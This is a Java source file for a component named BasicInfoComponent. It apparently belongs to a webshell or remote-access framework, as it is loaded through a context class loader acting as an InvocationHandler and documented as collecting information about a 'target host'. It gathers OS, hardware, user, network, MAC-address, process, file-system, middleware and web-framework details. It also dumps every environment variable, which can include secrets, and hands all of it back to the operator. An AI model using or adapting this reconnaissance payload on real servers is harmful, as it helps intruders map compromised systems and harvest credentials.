package org.leo.core.component;

import java.io.File;
import java.lang.management.ManagementFactory;
import java.lang.management.MemoryMXBean;
import java.lang.management.RuntimeMXBean;
import java.lang.management.ThreadMXBean;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * 系统基础信息收集组件
 * 用于收集目标主机的硬件、操作系统、Java运行时、网络等信息
 *
 * v3.0 修复：
 * 1. com.sun.management 硬依赖 → 反射调用，非 Oracle JVM 自动 fallback
 * 2. getBootClassPath() Java 9+ 异常 → try-catch 隔离
 * 3. middlewareInfo 缓存永不失效 → 加 TTL（10 分钟）
 * 4. getHostName() DNS 阻塞 → 先读环境变量 fallback InetAddress
 * 5. formatUptime 中文硬编码 → 纯英文 "Xd HH:MM:SS"
 * 6. for-each → 索引遍历，与其他 Component 风格一致
 * 7. 去掉类级 @SuppressWarnings / @Override 保留
 *
 * 遵循 COMPONENT_GUIDE.md：Java 1.6 语法，无 lambda/匿名内部类/diamond。
 *
 * @author LeoSpring
 * @version 3.0
 */
public class BasicInfoComponent implements Runnable {

    // 常量定义
    private static final long BYTES_TO_MB = 1024 * 1024;

    // 时间格式化常量
    private static final long MILLIS_PER_SECOND = 1000;
    private static final long MILLIS_PER_MINUTE = 60 * MILLIS_PER_SECOND;
    private static final long MILLIS_PER_HOUR = 60 * MILLIS_PER_MINUTE;
    private static final long MILLIS_PER_DAY = 24 * MILLIS_PER_HOUR;

    // 【修复 #3】middlewareInfo 缓存 TTL：10 分钟
    private static final long MIDDLEWARE_CACHE_TTL_MS = 10 * 60 * 1000;

    // 缓存系统信息，避免重复调用
    // 【修复 #1】osBean 改为 Object，不再硬引用 com.sun.management 类
    private static volatile Object osBean;
    private static volatile Class sunOsBeanClass; // com.sun.management.OperatingSystemMXBean 接口 Class
    private static volatile RuntimeMXBean runtimeBean;
    private static volatile MemoryMXBean memoryBean;
    private static volatile ThreadMXBean threadBean;
    private static volatile String hostName;
    // 【修复 #3】增加缓存时间戳
    private static volatile Map middlewareInfo;
    private static volatile long middlewareCacheTime;

    private ClassLoader currentThreadClassLoader;

    // 组件接口字段
    private HashMap params;
    private HashMap results;

    
    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


    /**
     * 主要执行方法
     */
    public void invoke() {
        currentThreadClassLoader = Thread.currentThread().getContextClassLoader();
        Map basicInfo = new HashMap();
        basicInfo.put("collectTime", Long.valueOf(System.currentTimeMillis()));
        basicInfo.put("HardwareInfo", getHardwareInfo());
        basicInfo.put("OSInfo", getOSInfo());
        basicInfo.put("MiddlewareInfo", getMiddlewareInfo());
        basicInfo.put("JavaRuntimeInfo", getJavaRuntimeInfo());
        basicInfo.put("UserInfo", getUserInfo());
        basicInfo.put("EnvironmentInfo", new HashMap(System.getenv()));
        basicInfo.put("NetworkInfo", getNetworkInfo());
        basicInfo.put("FileSystemInfo", getFileSystemInfo());
        basicInfo.put("ProcessInfo", getProcessInfo());
        basicInfo.put("WebFramework", detectWebFramework());
        results.put("BasicInfo", basicInfo);
        results.put("code", 200);
    }

    /**
     * 获取硬件信息
     * 【修复 #1】通过反射调用 com.sun.management API，fallback 到标准 API
     */
    public Map getHardwareInfo() {
        Map info = new HashMap();
        try {
            java.lang.management.OperatingSystemMXBean stdOs = ManagementFactory.getOperatingSystemMXBean();
            info.put("AvailableProcessors", Integer.valueOf(stdOs.getAvailableProcessors()));
            info.put("SystemLoadAverage", formatLoadAverage(stdOs.getSystemLoadAverage()));

            // 尝试 com.sun.management 扩展方法（反射）
            Object sunOs = getSunOsBean();
            if (sunOs != null) {
                Class sunOsClass = getSunOsBeanClass(); // 用接口 Class 查方法，而非实现类

                long totalPhysical = invokeLongMethod(sunOs, sunOsClass, "getTotalPhysicalMemorySize", -1L);
                long freePhysical = invokeLongMethod(sunOs, sunOsClass, "getFreePhysicalMemorySize", -1L);

                if (totalPhysical > 0 && freePhysical >= 0) {
                    long usedPhysical = totalPhysical - freePhysical;
                    info.put("TotalPhysicalMemoryMB", Long.valueOf(bytesToMB(totalPhysical)));
                    info.put("FreePhysicalMemoryMB", Long.valueOf(bytesToMB(freePhysical)));
                    info.put("UsedPhysicalMemoryMB", Long.valueOf(bytesToMB(usedPhysical)));
                    info.put("PhysicalMemoryUsagePercent", Double.valueOf(calculateUsagePercent(usedPhysical, totalPhysical)));
                }

                long totalSwap = invokeLongMethod(sunOs, sunOsClass, "getTotalSwapSpaceSize", -1L);
                long freeSwap = invokeLongMethod(sunOs, sunOsClass, "getFreeSwapSpaceSize", -1L);

                if (totalSwap > 0 && freeSwap >= 0) {
                    long usedSwap = totalSwap - freeSwap;
                    info.put("TotalSwapSpaceMB", Long.valueOf(bytesToMB(totalSwap)));
                    info.put("FreeSwapSpaceMB", Long.valueOf(bytesToMB(freeSwap)));
                    info.put("UsedSwapSpaceMB", Long.valueOf(bytesToMB(usedSwap)));
                    info.put("SwapUsagePercent", Double.valueOf(calculateUsagePercent(usedSwap, totalSwap)));
                }
            } else {
                info.put("note", "com.sun.management not available, physical memory info unavailable");
            }

        } catch (Exception e) {
            info.put("error", "failed to get hardware info: " + e.getMessage());
        }
        return info;
    }

    /**
     * 获取操作系统信息
     * 【修复 #4】hostname 优先读环境变量
     */
    public Map getOSInfo() {
        Map info = new HashMap();
        try {
            java.lang.management.OperatingSystemMXBean stdOs = ManagementFactory.getOperatingSystemMXBean();
            String host = getHostNameSafe();

            info.put("OSName", stdOs.getName());
            info.put("OSVersion", stdOs.getVersion());
            info.put("OSArch", stdOs.getArch());
            info.put("HostName", host);
            info.put("SystemUptime", formatUptime(getRuntimeBean().getUptime()));
            info.put("StartTime", new Date(getRuntimeBean().getStartTime()));

        } catch (Exception e) {
            info.put("error", "failed to get OS info: " + e.getMessage());
        }
        return info;
    }

    /**
     * 获取中间件信息
     * 【修复 #3】加 TTL 缓存过期
     */
    public Map getMiddlewareInfo() {
        long now = System.currentTimeMillis();
        if (middlewareInfo != null && (now - middlewareCacheTime) < MIDDLEWARE_CACHE_TTL_MS) {
            return new HashMap(middlewareInfo);
        }

        String middlewareType = detectMiddleware();
        Map info = new HashMap();
        info.put("MiddlewareType", middlewareType);
        try {
            if ("Tomcat".equals(middlewareType)) {
                info.put("Version", getTomcatVersion());
                info.put("Home", System.getProperty("catalina.home"));
                info.put("Base", System.getProperty("catalina.base"));
            } else if ("WebLogic".equals(middlewareType)) {
                info.put("Version", Class.forName("weblogic.version", false, currentThreadClassLoader)
                        .getMethod("getVersions").invoke(null));
                info.put("Home", System.getProperty("weblogic.home"));
                info.put("Domain", System.getProperty("weblogic.domain"));
            } else if ("WebSphere".equals(middlewareType)) {
                info.put("Version", System.getProperty("was.install.root"));
                info.put("Home", System.getProperty("was.install.root"));
            } else if ("Apusic".equals(middlewareType)) {
                info.put("Version", System.getProperty("APP_SERVER_VERSION"));
                info.put("Home", System.getProperty("APP_SERVER_HOME"));
            } else if ("Resin".equals(middlewareType)) {
                info.put("Version", Class.forName("com.caucho.Version", false, currentThreadClassLoader)
                        .getField("FULL_VERSION").get(null));
                info.put("Home", System.getProperty("APP_SERVER_HOME"));
            } else {
                info.put("Version", "unknown");
            }
        } catch (Exception e) {
            info.put("MiddlewareType", "Unknown");
            info.put("Error", e.getMessage());
        }

        middlewareInfo = info;
        middlewareCacheTime = now;
        return new HashMap(info);
    }

    /**
     * 获取Java运行时信息
     * 【修复 #2】getBootClassPath() 用 try-catch 隔离
     */
    public Map getJavaRuntimeInfo() {
        Map javaInfo = new HashMap();
        try {
            RuntimeMXBean runtime = getRuntimeBean();
            MemoryMXBean memory = getMemoryBean();
            Runtime runtimeInstance = Runtime.getRuntime();

            // JVM 基本信息
            javaInfo.put("JVMName", System.getProperty("java.vm.name"));
            javaInfo.put("JVMVersion", System.getProperty("java.vm.version"));
            javaInfo.put("JavaVersion", System.getProperty("java.version"));
            javaInfo.put("JavaHome", System.getProperty("java.home"));
            javaInfo.put("JavaVendor", System.getProperty("java.vendor"));

            // JVM 启动参数
            javaInfo.put("JVMArguments", runtime.getInputArguments());
            javaInfo.put("ClassPath", runtime.getClassPath());

            // 【修复 #2】getBootClassPath 在 Java 9+ 会抛 UnsupportedOperationException
            try {
                javaInfo.put("BootClassPath", runtime.getBootClassPath());
            } catch (UnsupportedOperationException e) {
                javaInfo.put("BootClassPath", "N/A (Java 9+ module system)");
            }

            // JVM 内存信息
            long totalMemory = runtimeInstance.totalMemory();
            long freeMemory = runtimeInstance.freeMemory();
            long maxMemory = runtimeInstance.maxMemory();
            long usedMemory = totalMemory - freeMemory;

            javaInfo.put("TotalMemoryMB", Long.valueOf(bytesToMB(totalMemory)));
            javaInfo.put("FreeMemoryMB", Long.valueOf(bytesToMB(freeMemory)));
            javaInfo.put("UsedMemoryMB", Long.valueOf(bytesToMB(usedMemory)));
            javaInfo.put("MaxMemoryMB", Long.valueOf(bytesToMB(maxMemory)));
            javaInfo.put("MemoryUsagePercent", Double.valueOf(calculateUsagePercent(usedMemory, totalMemory)));

            // 堆内存信息
            long heapUsed = memory.getHeapMemoryUsage().getUsed();
            long heapMax = memory.getHeapMemoryUsage().getMax();
            javaInfo.put("HeapUsedMB", Long.valueOf(bytesToMB(heapUsed)));
            javaInfo.put("HeapMaxMB", Long.valueOf(bytesToMB(heapMax)));
            javaInfo.put("HeapUsagePercent", Double.valueOf(calculateUsagePercent(heapUsed, heapMax)));

            // 线程信息
            ThreadMXBean thread = getThreadBean();
            javaInfo.put("ThreadCount", Integer.valueOf(thread.getThreadCount()));
            javaInfo.put("PeakThreadCount", Integer.valueOf(thread.getPeakThreadCount()));
            javaInfo.put("TotalStartedThreadCount", Long.valueOf(thread.getTotalStartedThreadCount()));

        } catch (Exception e) {
            javaInfo.put("error", "failed to get Java runtime info: " + e.getMessage());
        }
        return javaInfo;
    }

    /**
     * 获取用户信息
     */
    public Map getUserInfo() {
        Map userInfo = new HashMap();
        try {
            userInfo.put("UserName", System.getProperty("user.name"));
            userInfo.put("UserHome", System.getProperty("user.home"));
            userInfo.put("UserDir", System.getProperty("user.dir"));
            userInfo.put("UserLanguage", System.getProperty("user.language"));
            userInfo.put("UserCountry", System.getProperty("user.country"));
            userInfo.put("UserTimezone", System.getProperty("user.timezone"));
        } catch (Exception e) {
            userInfo.put("error", "failed to get user info: " + e.getMessage());
        }
        return userInfo;
    }

    /**
     * 获取文件系统信息
     */
    public List getFileSystemInfo() {
        List fileSystemInfo = new ArrayList();
        try {
            File[] roots = File.listRoots();
            if (roots != null) {
                for (int i = 0; i < roots.length; i++) {
                    File root = roots[i];
                    Map storeInfo = new HashMap();
                    storeInfo.put("Name", root.getPath());
                    storeInfo.put("Root", root.getPath());
                    storeInfo.put("Type", "File System");

                    // getTotalSpace/getUsableSpace 是 Java 1.6+，反射调用兼容 1.5
                    long totalSpace = invokeFileSpaceMethod(root, "getTotalSpace");
                    long usableSpace = invokeFileSpaceMethod(root, "getUsableSpace");

                    if (totalSpace >= 0 && usableSpace >= 0) {
                        long usedSpace = totalSpace - usableSpace;
                        storeInfo.put("TotalSpaceMB", Long.valueOf(bytesToMB(totalSpace)));
                        storeInfo.put("UsableSpaceMB", Long.valueOf(bytesToMB(usableSpace)));
                        storeInfo.put("UsedSpaceMB", Long.valueOf(bytesToMB(usedSpace)));
                        storeInfo.put("UsagePercent", Double.valueOf(calculateUsagePercent(usedSpace, totalSpace)));
                    } else {
                        storeInfo.put("note", "space info unavailable (Java < 1.6)");
                    }

                    fileSystemInfo.add(storeInfo);
                }
            }
        } catch (Exception e) {
            Map errorInfo = new HashMap();
            errorInfo.put("error", "failed to get filesystem info: " + e.getMessage());
            fileSystemInfo.add(errorInfo);
        }
        return fileSystemInfo;
    }

    /**
     * 获取网络信息
     */
    private List getNetworkInfo() {
        List networkInfo = new ArrayList();
        try {
            Enumeration interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface networkInterface = (NetworkInterface) interfaces.nextElement();
                Map interfaceInfo = new HashMap();
                interfaceInfo.put("Name", networkInterface.getName());
                interfaceInfo.put("DisplayName", networkInterface.getDisplayName());
                interfaceInfo.put("IsUp", Boolean.valueOf(networkInterface.isUp()));
                interfaceInfo.put("IsLoopback", Boolean.valueOf(networkInterface.isLoopback()));
                interfaceInfo.put("IsPointToPoint", Boolean.valueOf(networkInterface.isPointToPoint()));
                interfaceInfo.put("IsVirtual", Boolean.valueOf(networkInterface.isVirtual()));
                interfaceInfo.put("MTU", Integer.valueOf(networkInterface.getMTU()));

                // 获取 MAC 地址
                byte[] mac = networkInterface.getHardwareAddress();
                if (mac != null) {
                    interfaceInfo.put("MACAddress", formatMacAddress(mac));
                }

                // 获取 IP 地址
                Enumeration addresses = networkInterface.getInetAddresses();
                List ipAddresses = new ArrayList();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = (InetAddress) addresses.nextElement();
                    ipAddresses.add(addr.getHostAddress());
                }
                interfaceInfo.put("IPAddresses", ipAddresses);
                networkInfo.add(interfaceInfo);
            }
        } catch (Exception e) {
            Map errorInfo = new HashMap();
            errorInfo.put("error", "failed to get network info: " + e.getMessage());
            networkInfo.add(errorInfo);
        }
        return networkInfo;
    }

    /**
     * 获取进程信息
     */
    private Map getProcessInfo() {
        Map processInfo = new HashMap();
        try {
            RuntimeMXBean runtime = getRuntimeBean();
            processInfo.put("ProcessId", getProcessId());
            processInfo.put("ProcessName", System.getProperty("sun.java.command"));
            processInfo.put("StartTime", new Date(runtime.getStartTime()));
            processInfo.put("Uptime", formatUptime(runtime.getUptime()));
        } catch (Exception e) {
            processInfo.put("error", "failed to get process info: " + e.getMessage());
        }
        return processInfo;
    }

    // ==================== 反射辅助方法 ====================

    /**
     * 【修复 #1】获取 com.sun.management.OperatingSystemMXBean（反射，不硬依赖）
     * 返回 null 表示当前 JVM 不支持
     */
    private static Object getSunOsBean() {
        if (osBean != null) {
            if ("UNAVAILABLE".equals(osBean)) {
                return null;
            }
            return osBean;
        }
        synchronized (BasicInfoComponent.class) {
            if (osBean != null) {
                if ("UNAVAILABLE".equals(osBean)) {
                    return null;
                }
                return osBean;
            }
            try {
                java.lang.management.OperatingSystemMXBean stdOs = ManagementFactory.getOperatingSystemMXBean();
                // 加载接口 Class 并缓存，用于后续反射查方法
                sunOsBeanClass = Class.forName("com.sun.management.OperatingSystemMXBean");
                osBean = stdOs;
            } catch (ClassNotFoundException e) {
                osBean = "UNAVAILABLE";
                return null;
            }
        }
        return osBean;
    }

    /**
     * 获取缓存的 com.sun.management.OperatingSystemMXBean 接口 Class
     */
    private static Class getSunOsBeanClass() {
        return sunOsBeanClass;
    }

    /**
     * 反射调用返回 long 的无参方法
     */
    private static long invokeLongMethod(Object obj, Class clazz, String methodName, long defaultValue) {
        try {
            Method m = clazz.getMethod(methodName);
            Object result = m.invoke(obj);
            if (result instanceof Number) {
                return ((Number) result).longValue();
            }
        } catch (Exception ignored) {
        }
        return defaultValue;
    }

    /**
     * 反射调用 File.getTotalSpace/getUsableSpace（Java 1.6+）
     * 返回 -1 表示方法不存在（Java 1.5）
     */
    private static long invokeFileSpaceMethod(File file, String methodName) {
        try {
            Method m = File.class.getMethod(methodName);
            Object result = m.invoke(file);
            if (result instanceof Number) {
                return ((Number) result).longValue();
            }
        } catch (Exception ignored) {
        }
        return -1L;
    }

    // ==================== MXBean 单例 ====================

    private static RuntimeMXBean getRuntimeBean() {
        if (runtimeBean == null) {
            synchronized (BasicInfoComponent.class) {
                if (runtimeBean == null) {
                    runtimeBean = ManagementFactory.getRuntimeMXBean();
                }
            }
        }
        return runtimeBean;
    }

    private static MemoryMXBean getMemoryBean() {
        if (memoryBean == null) {
            synchronized (BasicInfoComponent.class) {
                if (memoryBean == null) {
                    memoryBean = ManagementFactory.getMemoryMXBean();
                }
            }
        }
        return memoryBean;
    }

    private static ThreadMXBean getThreadBean() {
        if (threadBean == null) {
            synchronized (BasicInfoComponent.class) {
                if (threadBean == null) {
                    threadBean = ManagementFactory.getThreadMXBean();
                }
            }
        }
        return threadBean;
    }

    // ==================== 辅助方法 ====================

    /**
     * 【修复 #4】安全获取主机名
     * 优先读环境变量，避免 DNS 反向查找阻塞
     */
    private static String getHostNameSafe() {
        if (hostName != null) {
            return hostName;
        }
        synchronized (BasicInfoComponent.class) {
            if (hostName != null) {
                return hostName;
            }

            // 1. 先尝试环境变量（无 DNS 开销）
            String name = System.getenv("HOSTNAME");        // Linux
            if (name != null && name.length() > 0) {
                hostName = name;
                return hostName;
            }
            name = System.getenv("COMPUTERNAME");            // Windows
            if (name != null && name.length() > 0) {
                hostName = name;
                return hostName;
            }

            // 2. fallback InetAddress（可能触发 DNS 查找）
            try {
                hostName = InetAddress.getLocalHost().getHostName();
            } catch (Exception e) {
                hostName = "unknown";
            }
        }
        return hostName;
    }

    private long bytesToMB(long bytes) {
        return bytes / BYTES_TO_MB;
    }

    private double calculateUsagePercent(long used, long total) {
        if (total <= 0) {
            return 0.0;
        }
        return Math.round((double) used / total * 1000) / 10.0;
    }

    /**
     * 格式化 MAC 地址
     * 【修复 #6】索引遍历替代 for-each
     */
    private String formatMacAddress(byte[] mac) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < mac.length; i++) {
            if (i > 0) {
                sb.append(':');
            }
            sb.append(hexByte(mac[i]));
        }
        return sb.toString();
    }

    /**
     * 单字节转两位十六进制（避免 String.format 开销）
     */
    private String hexByte(byte b) {
        int v = b & 0xFF;
        char hi = "0123456789ABCDEF".charAt(v >>> 4);
        char lo = "0123456789ABCDEF".charAt(v & 0x0F);
        return new String(new char[]{hi, lo});
    }

    private String formatLoadAverage(double load) {
        if (load < 0) {
            return "N/A";
        }
        return String.format("%.2f", Double.valueOf(load));
    }

    /**
     * 【修复 #5】格式化运行时间 — 纯英文 "Xd HH:MM:SS"
     */
    private String formatUptime(long uptime) {
        long days = uptime / MILLIS_PER_DAY;
        long hours = (uptime % MILLIS_PER_DAY) / MILLIS_PER_HOUR;
        long minutes = (uptime % MILLIS_PER_HOUR) / MILLIS_PER_MINUTE;
        long seconds = (uptime % MILLIS_PER_MINUTE) / MILLIS_PER_SECOND;

        return days + "d " + pad2(hours) + ":" + pad2(minutes) + ":" + pad2(seconds);
    }

    /**
     * 两位补零（避免 String.format）
     */
    private String pad2(long val) {
        if (val < 10) {
            return "0" + val;
        }
        return String.valueOf(val);
    }

    private String getProcessId() {
        try {
            return getRuntimeBean().getName().split("@")[0];
        } catch (Exception e) {
            return "unknown";
        }
    }

    private String getTomcatVersion() {
        try {
            Class serverInfoClass = Class.forName("org.apache.catalina.util.ServerInfo",
                    false, currentThreadClassLoader);
            Method getServerInfoMethod = serverInfoClass.getMethod("getServerInfo");
            return (String) getServerInfoMethod.invoke(null);
        } catch (Exception e) {
            return "unknown";
        }
    }

    private boolean exists(String className) {
        try {
            Class.forName(className, false, currentThreadClassLoader);
            return true;
        } catch (ClassNotFoundException e) {
            return false;
        }
    }

    private String detectWebFramework() {
        if (exists("org.springframework.boot.SpringApplication")
                && exists("org.springframework.web.reactive.DispatcherHandler")) {
            return "Spring Boot (WebFlux)";
        }
        if (exists("org.springframework.boot.SpringApplication")
                && exists("org.springframework.web.servlet.DispatcherServlet")) {
            return "Spring Boot (MVC)";
        }
        if (exists("org.springframework.web.reactive.DispatcherHandler")) {
            return "WebFlux";
        }
        if (exists("org.springframework.web.servlet.DispatcherServlet")) {
            return "Spring MVC";
        }
        if (exists("org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter")) {
            return "Struts2";
        }
        if (exists("javax.faces.webapp.FacesServlet")) {
            return "JSF";
        }
        if (exists("javax.servlet.Servlet") || exists("jakarta.servlet.Servlet")) {
            return "Servlet";
        }
        return "Unknown";
    }

    private String detectMiddleware() {
        if (exists("com.caucho.Version")) {
            return "Resin";
        }
        if (exists("com.apusic.web.container.WebContainer")) {
            return "Apusic";
        }
        if (exists("com.ibm.websphere.runtime.Server")) {
            return "WebSphere";
        }
        if (exists("weblogic.version")) {
            return "WebLogic";
        }
        if (exists("org.apache.catalina.Server")) {
            return "Tomcat";
        }
        return "Unknown";
    }
}
